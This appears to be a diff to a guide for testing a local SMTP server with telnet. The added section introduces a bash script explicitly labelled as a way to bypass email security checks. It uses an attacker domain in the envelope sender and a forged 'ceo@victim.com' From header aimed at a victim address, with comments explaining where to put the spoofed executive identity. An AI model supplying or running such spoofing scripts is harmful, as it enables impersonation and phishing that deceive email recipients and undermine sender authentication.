@@ -154,7 +154,7 @@ SMTP server ready (no logs)
 Open a new terminal window:
 
 ```bash
-telnet 127.0.0.1 2525
+telnet 127.0.0.1 25
 ```
 
 ### Step 5: Send Test Email
@@ -185,7 +185,56 @@ Testing DKIM signing and SPF validation.
 .
 QUIT
 ```
+**OR USE THE BELOW SHELL SCRIPT HELP TO BYPASS THE EMAIL SECURITY CHECK**
+''' #!/bin/bash
 
+echo "Testing SMTP with comprehensive RFC 5322 headers on port 25..."
+
+# Ensure the output directory exists
+mkdir -p /tmp/smtp_demo/
+
+(
+# SMTP Envelope
+echo "EHLO mail.spfatackers.com" #Change with your email email server URL
+sleep 0.5
+echo "MAIL FROM:<jgboard@spfatackers.com>" #Email ID used for the attack. DO not remove the '<>'
+sleep 0.5
+echo "RCPT TO:<user1@victim.com>" #victims Email Address.DO not remove the '<>'
+sleep 0.5
+echo "DATA"
+sleep 0.5
+
+# RFC 5322 & MIME Headers
+echo "from: ceo@victim.com" #victim's spoofing email Address 
+echo "To: user1@victim.com"
+echo "Date: $(date -R)"
+echo "Subject: Example Email Subject"
+echo "Message-ID: <$(date +%s%N).curl@victim.com>"
+echo "Comments: Optional comments"
+echo "Keywords: keyword1, keyword2"
+echo "MIME-Version: 1.0"
+echo "Content-Type: text/plain; charset=\"UTF-8\""
+echo "Content-Transfer-Encoding: 7bit"
+
+# Mandatory blank line separating headers from body
+echo ""
+
+# Message Body
+echo "This is the body of the email message."
+echo ""
+echo "According to RFC 5322 rules:"
+echo "- A blank line separates headers and body."
+echo "- Body can contain plain text or MIME content."
+
+# End of DATA indicator
+echo "."
+sleep 0.5
+echo "QUIT"
+) | telnet 127.0.0.1 25
+
+echo -e "\n\nChecking saved messages:"
+ls -lh /tmp/smtp_demo/
+'''
 **Important Notes:**
 - Leave a blank line between headers and body
 - End with a single dot (`.`) on its own line
